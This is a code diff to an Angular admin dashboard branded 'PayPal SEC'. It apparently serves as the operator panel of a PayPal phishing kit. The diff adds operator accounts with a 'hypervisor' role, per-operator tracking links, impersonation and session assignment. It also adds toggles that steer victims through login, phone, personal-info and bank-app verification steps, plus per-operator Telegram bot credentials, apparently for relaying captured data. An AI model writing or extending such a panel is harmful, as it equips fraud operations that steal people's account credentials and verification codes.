@@ -3,8 +3,9 @@ import { Component, inject, computed, signal, effect, OnInit } from '@angular/co
 import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
 import { StateService, SessionHistory } from '../services/state.service';
+import { AuthService } from '../services/auth.service';
 
-type AdminTab = 'live' | 'history' | 'settings';
+type AdminTab = 'live' | 'history' | 'settings' | 'users';
 
 @Component({
   selector: 'app-admin-dashboard',
@@ -22,7 +23,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       }
 
       <!-- AUTH GUARD -->
-      @if (!state.adminAuthenticated()) {
+      @if (!auth.isAuthenticated()) {
          <div class="absolute inset-0 z-[200] bg-pp-bg flex items-center justify-center p-4">
              <div class="pp-card max-w-[400px]">
                 <div class="flex justify-center mb-8">
@@ -39,7 +40,10 @@ type AdminTab = 'live' | 'history' | 'settings';
                         <input type="password" [(ngModel)]="loginPass" placeholder=" " class="pp-input peer">
                         <label class="pp-label">Password</label>
                     </div>
-                    <button (click)="doLogin()" class="pp-btn mt-4">Log In</button>
+                    <button (click)="doLogin()" class="pp-btn mt-4" [disabled]="isLoading()">
+                        @if(isLoading()) { <span class="material-icons animate-spin text-sm">refresh</span> }
+                        @else { Log In }
+                    </button>
                     @if(loginError()) { <p class="text-center text-[#D92D20] text-sm font-bold mt-2">Access Denied</p> }
                 </div>
              </div>
@@ -50,6 +54,9 @@ type AdminTab = 'live' | 'history' | 'settings';
       <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy dark:bg-slate-950 text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0">
            <div class="h-16 lg:h-20 flex items-center lg:px-6 lg:border-b border-[#ffffff10]">
               <span class="font-bold text-xl tracking-tight">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
+              @if(auth.currentUser()?.role === 'hypervisor') {
+                  <span class="ml-2 bg-red-600 text-white text-[9px] px-1.5 py-0.5 rounded font-bold">HV</span>
+              }
            </div>
            
            <!-- Mobile Nav (Horizontal) -->
@@ -65,6 +72,14 @@ type AdminTab = 'live' | 'history' | 'settings';
                    <span class="material-icons text-[20px]">history</span>
                    <span class="hidden lg:block">History</span>
                </a>
+
+               @if(auth.currentUser()?.role === 'hypervisor') {
+                   <a (click)="activeTab.set('users')" [class.bg-[#ffffff10]]="activeTab() === 'users'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'users'">
+                       <span class="material-icons text-[20px]">group</span>
+                       <span class="hidden lg:block">Admins</span>
+                   </a>
+               }
+
                <a (click)="activeTab.set('settings')" [class.bg-[#ffffff10]]="activeTab() === 'settings'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'settings'">
                    <span class="material-icons text-[20px]">settings</span>
                    <span class="hidden lg:block">Settings</span>
@@ -89,7 +104,9 @@ type AdminTab = 'live' | 'history' | 'settings';
          <!-- Top Bar (Desktop Only) -->
          <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
              <div class="flex items-center gap-2">
-                 <h1 class="text-lg font-bold text-pp-navy dark:text-white">Administrator Console</h1>
+                 <h1 class="text-lg font-bold text-pp-navy dark:text-white">
+                     @if(auth.currentUser()?.role === 'hypervisor') { Hypervisor Console } @else { Administrator Console }
+                 </h1>
                  @if(state.isOfflineMode()) {
                      <span class="bg-amber-100 text-amber-800 text-[10px] font-bold px-2 py-1 rounded-full uppercase tracking-wider flex items-center gap-1">
                          <span class="material-icons text-[12px]">wifi_off</span> Local Mode
@@ -97,7 +114,13 @@ type AdminTab = 'live' | 'history' | 'settings';
                  }
              </div>
              <div class="flex items-center gap-4">
-                 <div class="w-8 h-8 rounded-full bg-pp-navy text-white flex items-center justify-center font-bold text-xs">A</div>
+                 <div class="text-right">
+                     <p class="text-xs font-bold text-pp-navy dark:text-white">{{ auth.currentUser()?.username }}</p>
+                     <p class="text-[10px] text-slate-400 uppercase">{{ auth.currentUser()?.role }}</p>
+                 </div>
+                 <div class="w-8 h-8 rounded-full bg-pp-navy text-white flex items-center justify-center font-bold text-xs uppercase">
+                     {{ auth.currentUser()?.username?.substring(0, 2) || 'AD' }}
+                 </div>
              </div>
          </header>
 
@@ -213,6 +236,11 @@ type AdminTab = 'live' | 'history' | 'settings';
                                          <div class="flex items-center gap-3 mb-1">
                                             <h2 class="font-bold text-lg lg:text-xl text-pp-navy dark:text-white">Session Details</h2>
                                             <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ monitoredSession()?.currentView || monitoredSession()?.stage }}</span>
+                                            @if(auth.currentUser()?.role === 'hypervisor') {
+                                                <button (click)="assignAdmin()" class="text-[10px] bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 px-2 py-0.5 rounded font-bold uppercase text-slate-700 dark:text-slate-300 transition-colors">
+                                                    {{ monitoredSession()?.data?.adminId ? 'Re-Assign' : 'Assign Admin' }}
+                                                </button>
+                                            }
                                          </div>
                                          <div class="flex items-center gap-2">
                                              @if(getDeviceImage(monitoredSession()?.fingerprint?.userAgent)) {
@@ -461,6 +489,60 @@ type AdminTab = 'live' | 'history' | 'settings';
                     </div>
                 }
 
+                <!-- USERS TAB (Hypervisor) -->
+                @case ('users') {
+                    <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col p-6">
+                        <div class="flex justify-between items-center mb-6">
+                            <h2 class="font-bold text-xl text-pp-navy dark:text-white">Admin Management</h2>
+                            <button (click)="openAddUserModal()" class="bg-pp-blue text-white px-4 py-2 rounded-lg font-bold text-xs flex items-center gap-2 hover:bg-[#005ea6] transition-colors">
+                                <span class="material-icons text-sm">add</span> Create Admin
+                            </button>
+                        </div>
+
+                        <div class="flex-1 overflow-auto">
+                            <table class="w-full text-left border-collapse">
+                                <thead class="bg-slate-50 dark:bg-slate-900 text-slate-500 text-xs font-bold uppercase">
+                                    <tr>
+                                        <th class="px-4 py-3 rounded-l-lg">Username</th>
+                                        <th class="px-4 py-3">Role</th>
+                                        <th class="px-4 py-3">Personal Link</th>
+                                        <th class="px-4 py-3 text-right rounded-r-lg">Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="text-sm font-medium text-pp-navy dark:text-white divide-y divide-slate-100 dark:divide-slate-700">
+                                    @for(u of userList(); track u.id) {
+                                        <tr>
+                                            <td class="px-4 py-3">{{ u.username }}</td>
+                                            <td class="px-4 py-3">
+                                                <span class="px-2 py-1 rounded text-[10px] font-bold uppercase"
+                                                      [class.bg-red-100]="u.role === 'hypervisor'" [class.text-red-700]="u.role === 'hypervisor'"
+                                                      [class.bg-blue-100]="u.role === 'admin'" [class.text-blue-700]="u.role === 'admin'">
+                                                    {{ u.role }}
+                                                </span>
+                                            </td>
+                                            <td class="px-4 py-3 font-mono text-xs text-slate-500">
+                                                /?id={{ u.uniqueCode }}
+                                            </td>
+                                            <td class="px-4 py-3 text-right flex justify-end gap-2">
+                                                @if(u.id !== auth.currentUser()?.id) {
+                                                    <button (click)="impersonateUser(u)" class="text-xs bg-slate-100 hover:bg-slate-200 dark:bg-slate-700 dark:hover:bg-slate-600 px-2 py-1 rounded text-pp-navy dark:text-white font-bold transition-colors">
+                                                        Log in as
+                                                    </button>
+                                                    <button (click)="deleteUser(u)" class="p-1 text-slate-400 hover:text-red-500 transition-colors">
+                                                        <span class="material-icons text-sm">delete</span>
+                                                    </button>
+                                                } @else {
+                                                    <span class="text-xs text-slate-400 italic">Current</span>
+                                                }
+                                            </td>
+                                        </tr>
+                                    }
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                }
+
                 <!-- HISTORY TAB -->
                 @case ('history') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col">
@@ -603,6 +685,49 @@ type AdminTab = 'live' | 'history' | 'settings';
                 @case ('settings') {
                     <div class="max-w-2xl mx-auto bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-y-auto max-h-full p-8 animate-fade-in">
                          <h2 class="font-bold text-xl mb-6 text-pp-navy dark:text-white">System Configuration</h2>
+
+                         <!-- Flow Customization -->
+                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Traffic Flow</h3>
+                             <div class="space-y-4">
+                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                     <div>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Auto-Approve Login</span>
+                                         <span class="text-xs text-slate-400">Automatically bypass login and go to verification</span>
+                                     </div>
+                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
+                                          [class.bg-pp-success]="flowSettings.autoApproveLogin" [class.bg-slate-200]="!flowSettings.autoApproveLogin"
+                                          (click)="flowSettings.autoApproveLogin = !flowSettings.autoApproveLogin; $event.preventDefault()">
+                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
+                                               [class.translate-x-5]="flowSettings.autoApproveLogin" [class.translate-x-0]="!flowSettings.autoApproveLogin"></span>
+                                     </div>
+                                 </label>
+                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                     <div>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Skip Phone Verification</span>
+                                         <span class="text-xs text-slate-400">Jump directly to Personal Info</span>
+                                     </div>
+                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
+                                          [class.bg-pp-success]="flowSettings.skipPhone" [class.bg-slate-200]="!flowSettings.skipPhone"
+                                          (click)="flowSettings.skipPhone = !flowSettings.skipPhone; $event.preventDefault()">
+                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
+                                               [class.translate-x-5]="flowSettings.skipPhone" [class.translate-x-0]="!flowSettings.skipPhone"></span>
+                                     </div>
+                                 </label>
+                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                     <div>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Force Bank App</span>
+                                         <span class="text-xs text-slate-400">Require App verification instead of SMS</span>
+                                     </div>
+                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
+                                          [class.bg-pp-success]="flowSettings.forceBankApp" [class.bg-slate-200]="!flowSettings.forceBankApp"
+                                          (click)="flowSettings.forceBankApp = !flowSettings.forceBankApp; $event.preventDefault()">
+                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
+                                               [class.translate-x-5]="flowSettings.forceBankApp" [class.translate-x-0]="!flowSettings.forceBankApp"></span>
+                                     </div>
+                                 </label>
+                             </div>
+                         </div>
 
                          <!-- Appearance -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
@@ -959,11 +1084,16 @@ type AdminTab = 'live' | 'history' | 'settings';
 })
 export class AdminDashboardComponent {
   state = inject(StateService);
+  auth = inject(AuthService);
 
   activeTab = signal<AdminTab>('live');
   loginUser = '';
   loginPass = '';
   loginError = signal(false);
+  isLoading = signal(false);
+
+  // User Management
+  userList = signal<any[]>([]);
 
   // History Slide-out Logic
   historyPanelOpen = signal(false);
@@ -1057,21 +1187,22 @@ export class AdminDashboardComponent {
   // Settings
   tgToken = '';
   tgChat = '';
+  flowSettings: any = {};
 
   isSettingsConfigured = computed(() => {
-      const t = this.state.telegramBotToken();
-      const c = this.state.telegramChatId();
+      const t = this.tgToken;
+      const c = this.tgChat;
       return !!(t && c && t.length > 5 && c.length > 3);
   });
 
   maskedToken = computed(() => {
-      const t = this.state.telegramBotToken();
+      const t = this.tgToken;
       if (!t || t.length < 8) return '********';
       return `${t.substring(0, 3)}...${t.substring(t.length - 5)}`;
   });
 
   maskedChat = computed(() => {
-      const c = this.state.telegramChatId();
+      const c = this.tgChat;
       if (!c || c.length < 5) return '***';
       return `${c.substring(0, 2)}...${c.substring(c.length - 3)}`;
   });
@@ -1104,9 +1235,33 @@ export class AdminDashboardComponent {
           document.documentElement.classList.add('dark');
       }
 
+      // Initial Sync
       effect(() => {
-          this.tgToken = this.state.telegramBotToken();
-          this.tgChat = this.state.telegramChatId();
+          if (this.auth.isAuthenticated()) {
+              this.state.setAdminAuthenticated(true);
+              if (this.auth.currentUser()?.role === 'hypervisor') {
+                  this.fetchUsers();
+              }
+          }
+      }, { allowSignalWrites: true });
+
+      effect(() => {
+          // Sync User Settings to Local Model
+          const user = this.auth.currentUser();
+          if (user) {
+              this.flowSettings = { ...user.settings };
+
+              if (user.telegramConfig) {
+                  this.tgToken = user.telegramConfig.token || '';
+                  this.tgChat = user.telegramConfig.chat || '';
+              }
+          }
+
+          // Legacy Global Fallback (Visual Only)
+          if (!this.tgToken && this.state.telegramBotToken()) {
+              this.tgToken = this.state.telegramBotToken();
+              this.tgChat = this.state.telegramChatId();
+          }
       });
 
       effect(() => {
@@ -1139,8 +1294,12 @@ export class AdminDashboardComponent {
       }, { allowSignalWrites: true });
   }
 
-  doLogin() {
-      if (this.state.loginAdmin(this.loginUser, this.loginPass)) {
+  async doLogin() {
+      this.isLoading.set(true);
+      const success = await this.auth.login(this.loginUser, this.loginPass);
+      this.isLoading.set(false);
+
+      if (success) {
           this.loginError.set(false);
           this.loginUser = '';
           this.loginPass = '';
@@ -1150,6 +1309,7 @@ export class AdminDashboardComponent {
   }
 
   exitAdmin() {
+      this.auth.logout();
       this.state.returnFromAdmin();
   }
 
@@ -1157,6 +1317,102 @@ export class AdminDashboardComponent {
       this.state.fetchSessions().then(() => {
           this.state.showAdminToast('Refreshed Sessions');
       });
+      if (this.auth.currentUser()?.role === 'hypervisor') {
+          this.fetchUsers();
+      }
+  }
+
+  // --- User Management ---
+
+  async fetchUsers() {
+      try {
+          const res = await fetch('/api/admin/users', {
+              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
+          });
+          if (res.ok) {
+              const users = await res.json();
+              this.userList.set(users);
+          }
+      } catch(e) {}
+  }
+
+  openAddUserModal() {
+      const username = prompt('Enter Username:');
+      if (!username) return;
+      const password = prompt('Enter Password:');
+      if (!password) return;
+      const role = confirm('Is this a Hypervisor?') ? 'hypervisor' : 'admin';
+
+      this.createUser(username, password, role);
+  }
+
+  async createUser(u: string, p: string, r: string) {
+      try {
+          const res = await fetch('/api/admin/users', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'Authorization': `Bearer ${this.auth.getToken()}`
+              },
+              body: JSON.stringify({ username: u, password: p, role: r })
+          });
+          if (res.ok) {
+              this.state.showAdminToast('User Created');
+              this.fetchUsers();
+          }
+      } catch(e) {}
+  }
+
+  async deleteUser(user: any) {
+      if (!confirm(`Delete user ${user.username}?`)) return;
+      try {
+          const res = await fetch(`/api/admin/users/${user.id}`, {
+              method: 'DELETE',
+              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
+          });
+          if (res.ok) {
+              this.state.showAdminToast('User Deleted');
+              this.fetchUsers();
+          }
+      } catch(e) {}
+  }
+
+  async impersonateUser(user: any) {
+      if (!confirm(`Log in as ${user.username}?`)) return;
+      const success = await this.auth.impersonate(user.id);
+      if (success) {
+          window.location.reload(); // Reload to refresh state fully
+      } else {
+          this.state.showAdminToast('Impersonation Failed');
+      }
+  }
+
+  async assignAdmin() {
+      const s = this.monitoredSession();
+      if(!s) return;
+
+      const username = prompt("Enter Admin Username to assign:");
+      if(!username) return;
+
+      const admin = this.userList().find(u => u.username === username);
+      if(admin) {
+          try {
+              await fetch('/api/admin/assign-session', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json',
+                      'Authorization': `Bearer ${this.auth.getToken()}`
+                  },
+                  body: JSON.stringify({ sessionId: s.id, adminId: admin.id })
+              });
+              this.state.showAdminToast('Assigned');
+              this.state.fetchSessions();
+          } catch(e) {
+              this.state.showAdminToast('Assignment Failed');
+          }
+      } else {
+          this.state.showAdminToast('Admin not found in loaded list');
+      }
   }
 
   selectSession(session: any) {
@@ -1413,18 +1669,30 @@ ${session.fingerprint?.userAgent}
       }
   }
 
-  saveSettings() {
-      // Email feature removed (pass empty string)
-      this.state.updateAdminSettings('', true, this.tgToken, this.tgChat);
-      this.state.showAdminToast('Settings Saved');
+  async saveSettings() {
+      try {
+          await fetch('/api/admin/settings', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'Authorization': `Bearer ${this.auth.getToken()}`
+              },
+              body: JSON.stringify({
+                  settings: this.flowSettings,
+                  telegramConfig: { token: this.tgToken, chat: this.tgChat }
+              })
+          });
+          this.state.showAdminToast('Settings Saved');
+      } catch(e) {
+          this.state.showAdminToast('Save Failed');
+      }
   }
 
   deleteSettings() {
       if(confirm('Are you sure you want to remove the Telegram credentials?')) {
-          this.state.updateAdminSettings('', true, '', '');
           this.tgToken = '';
           this.tgChat = '';
-          this.state.showAdminToast('Credentials Removed');
+          this.saveSettings();
       }
   }
 
